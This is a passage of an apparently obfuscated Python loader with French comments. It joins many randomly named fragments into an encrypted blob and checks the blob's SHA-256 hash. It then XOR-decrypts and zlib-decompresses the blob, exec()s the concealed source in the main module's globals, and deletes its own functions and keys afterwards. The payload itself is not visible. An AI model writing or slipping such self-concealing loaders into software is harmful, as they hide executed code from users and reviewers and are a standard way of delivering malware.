_c_zOUGshQ5HDxM + _crXBjloXBpBkt_ + _cqQk8LtOkoVxFW + _cuBL5mufWLsntB + _crFpSEhpyLGrPi + _czAIj9EE4H4VAa + _cb2o5U72l2sCVl + _cwYnG2pMujmTAd + _cna5zyOne9ks2Q + _coS7LChwiuvqHS + _czqsxo_cAwYXvr + _cnPtW6pTXwGRwW + _cyeuzbVmWjY6Jv + _cljgIrB7YSuPKM + _cuiUEt5W7nmhxr + _cfEv8HpG10s4cP + _coLUs2vVMmIjP7 + _csPGhxvYm9kvjE + _cpFx8CUjFXOG4l + _cxEWSHl0Ll_KR7 + _caJioPxth7DkRz + _cvyAxGiBMqtgHd + _cbhqZs23bwgUh3 + _cpLc6gTnVIcZVp + _cdvSaUBN0MgM_J + _ceCQVHlPp3vj63 + _csjQ1SAAQfeT_L + _cpSD3UY1EYlSh7 + _cfQMzrKlhRrsf0 + _cjn_cXJHW0Gz5l + _czTVxKKTAIq_MM + _cxJDdhozg4tg25 + _cxXTUvsaCHmc5m + _cmLhOwVGkaGUd0 + _cxi0Gm0mSfTSFj + _cocZ9CtbPM6USt + _ctrICflMaDHutg + _ctyJPfoBErWxNO + _cglTbXtjermf0J + _crDznZ0rNSPXZj + _cqTDv0DXofnafP + _clyx38O_mNK6LW + _cxuw26OmPYPgAU + _cjU98dBfVQ8tYu + _cgdENg_QBLcqLB + _ctHcssQ5TWoZlg + _cyQ_AKRdUgM43u + _cen91AlkAV7S8L + _ciIKSZAzQn8M34 + _csiZODJ_GdpQbW + _cgfCdTMqupX1HY + _chjOw936g0w00S + _cgJY2aq3mQMOxZ + _cf4twzc2ilkoW2 + _cke0f0Efcobpw6 + _ceIkGXVYk4EGF9 + _cyKybDtSmN_55J + _crJMooCd9aiI8j + _c_2h8BxHfNL94v + _caiWj_DiSOvwVa + _cg2r4Yh58Zlw52 + _czCrWHmBSXHgbE + _cqE5NuqmyEacqi + _cnNTuAdvgphwH9 + _cnDKi9iq2Hq4Vc + _cgmpGLAauuXrzo + _ctDDnv0ugf8cHb + _ccCteBWXGuuGxj + _cgFZecEa64uVVG + _cvwhzScuyJsNnU + _csiI68mZfimTJz + _caaYtnbbHoYvlW + _czO1NnsCO14N4y + _ckgh78qZmKgcXt + _cowj0_4Os0gKJZ + _caRC_fE1nCXBm0 + _cq002nfi397JH2 + _cvoWqS6Lw3Rb3Q + _cs2WGdo0lt8Lm0 + _caK3f6UsRogIkm + _cjo5q_I_WMokug + _cuObYhkkZKftxa + _cmWM9WX6v8D3jv + _cl9toXXppF0Cyh + _cnH70wJAZFE0LF + _cnzy171lX9ot3W + _ckHeV6J9oPU7na + _csmcGBvI0ZACKF + _cc2o3ipBpumped + _cg5F1DEiuANc7w + _chpsSGE1U06RL7 + _clhUycd1GW8tsi + _cwg6vNAYI3vWys + _ctU5yu8ftT4AgG + _cokVo2liIn1MNn + _crImmqnlMSJVt0 + _cvRANTAbBe9IAH + _coivMIsm917f2C + _cfv5Z3kCZbqcId + _crlRL6TeOW58A0 + _cvr09x7bXibRdi + _croY3kqajUm2jU + _cv8nZ2TW2nhYrs + _cwUj0cS7VZp7UU + _cupIs0KkCwPfGJ + _cnTwNf8CCgL_Nx + _caB8ROG8onKgFP + _cicvZlsrkzmfV3 + _ckMcpaIchXAN2Y + _cdvchYVshI32oA + _crgGxzNeCraIKo + _cld2VvLFCd0s6Z + _cqaHAKcwGm6HP6 + _cu1UDyNG_1ZZEJ + _cvpUlvLKVPp93o + _csGlTcvREBzBXP + _cslFjIKKwgU3DW + _cmm6hpP1eZK6vT + _cwJRVCmS_rZgUw + _cgHgXEO6Qbdvtj + _cd6g53mbQzSokR + _ch7IPY7WP8hb1P + _cvtswSyj1_MZhK + _cnbeOI97AJ06m2 + _cdFNhcw4_2hIKn + _cy1wK9IqDiQIio + _ce0TdmoOBHC0kh + _ck84yW4xnh1ZoJ + _cdPPRbuokQ9YxH + _c_7ToUJOSGd5_N + _cdKyE6oxiMPCcO + _ccZihjGzBrW2Wy + _cnjzwdeN_82Dtj + _caqdeu8o831YuD + _cuhyznxy0SOJ1W + _cjlaQGcWT4wH8f + _cyzXE2u_mEe2UR + _crEIz0gGiuNAkS + _cbvcnmLlX93wS_ + _cgZw0buieywcFw + _cuIMeYLpVcnbfD + _cctqfdoaSt6ly0 + _cvrOgBQqqVwfON + _cuWfgX1x0qf73a + _cyso1nsYdpPv_A + _ccEIFY0Ks2oom1 + _cf92xq6E17P1ra + _ckDTNrrBc5XJIC + _cjYf6JOD1JLiwb + _cd4x6ZO1dcGnue + _cclq8Cst3RWXZp + _csYdzRBlgHSizJ + _cmSbWrJAiGfj7j + _cgnHpTZ2JVULQo + _cftZHOoXapB2wW + _cnDB_xUTMbNNk1 + _cn5AviRSmPf5nB + _cdT5Y7BK_IgzN8)
if __import__('hashlib').sha256(_pyFhlgnoC6CO85).hexdigest() != '7bf6be97e6ea1912d537b92754084abf53723e4b7445b6f4f572cf715d1259e7':
    __import__('sys').exit(1)
_xvyG93UeF2_YVF = bytes([76, 139, 146, 72, 229, 61, 232, 141, 174, 42, 122, 34, 107, 82, 239, 193, 229, 243, 231, 111, 159])
_fkxciO6BxLC17Vu = bytes([7, 50, 146, 241, 131, 25, 141, 221, 137, 26, 241, 220, 37, 181, 143, 89, 215, 211, 210, 136, 134])

def _fxsYRp6H4L1zc_2(_bpBLTSSsgWMhVE, _khL4ifqdrW5oTK):
    return bytes(_bpBLTSSsgWMhVE[_ixnCaoyyeXBRN5] ^ _khL4ifqdrW5oTK[_ixnCaoyyeXBRN5 % len(_khL4ifqdrW5oTK)] for _ixnCaoyyeXBRN5 in range(len(_bpBLTSSsgWMhVE)))

def _fdsCPfE2E53NcGw(_tyGOeBmS8bZO6i):
    import zlib
    return zlib.decompress(_tyGOeBmS8bZO6i) # Un seul niveau de zlib ici pour simplifier

def _feqkYBu1peykDf_():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xzYmHx6aWH83FI = _fxsYRp6H4L1zc_2(_pyFhlgnoC6CO85, _xvyG93UeF2_YVF)
    # 2. Décompression Zlib
    _dcO_W972ffbAI9 = _fdsCPfE2E53NcGw(_xzYmHx6aWH83FI)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dcO_W972ffbAI9.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nkozAPwUXXwaxg = _main.__dict__
    _nkozAPwUXXwaxg.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nkozAPwUXXwaxg)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feqkYBu1peykDf_()
try:
    del _fxsYRp6H4L1zc_2, _fdsCPfE2E53NcGw, _feqkYBu1peykDf_
    del _pyFhlgnoC6CO85, _xvyG93UeF2_YVF, _fkxciO6BxLC17Vu
except:
    pass
